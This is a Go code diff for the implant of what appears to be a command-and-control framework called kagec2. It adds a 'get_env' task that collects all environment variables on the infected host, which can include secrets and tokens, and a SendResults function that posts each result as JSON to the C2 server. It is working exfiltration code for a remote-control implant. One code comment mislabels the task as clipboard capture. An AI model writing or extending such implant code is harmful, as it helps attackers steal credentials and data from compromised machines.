@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/md5" // #nosec G501 -- This import isn't needed for functions that need to be cryptographically secure
 	"encoding/hex"
 	"encoding/json"
@@ -12,10 +13,12 @@ import (
 	"os"
 	"os/user"
 	"runtime"
+	"strings"
 
 	"github.com/denisbrodbeck/machineid"
 	"github.com/google/uuid"
 	"github.com/thecloudnativehacker/kagec2/server/pkg/models"
+	"golang.org/x/sys/unix"
 )
 
 type Agent interface {
@@ -122,7 +125,18 @@ func (i *thisImplant) runTask(t models.Task) (models.Result, error) {
 		defer f.Close()
 		r.Contents = "File created successfully."
 		return r, nil
-
+	case "get_env":
+		//just gets clipboard text for now
+		r := models.Result{}
+		r.AgentId = i.Id
+		r.TaskId = t.Id
+		contents := unix.Environ()
+		if contents == nil {
+			r.Contents = "Could not"
+		}
+		r.Contents = strings.Join(contents, "|")
+		log.Println(r.Contents)
+		return r, nil
 	default:
 		return models.Result{}, errors.New("No such task type found. " + t.Type)
 	}
@@ -130,8 +144,21 @@ func (i *thisImplant) runTask(t models.Task) (models.Result, error) {
 }
 
 func (i *thisImplant) SendResults() error {
+	reqURL := "http://" + i.C2Host + i.C2Port + i.C2ResultsURI + "?agent_id=" + i.Id.String()
+	for _, res := range *i.Results {
+		data, err := json.Marshal(res)
+		log.Println(res.Contents)
+		if err != nil {
+			return err
+		}
+		_, err = i.Client.Post(reqURL, "application/json", bytes.NewBuffer(data))
+		if err != nil {
+			return err
+		}
+	}
 	return nil
 }
+
 func (i *thisImplant) SendTaskHistory() error {
 	return nil
 }
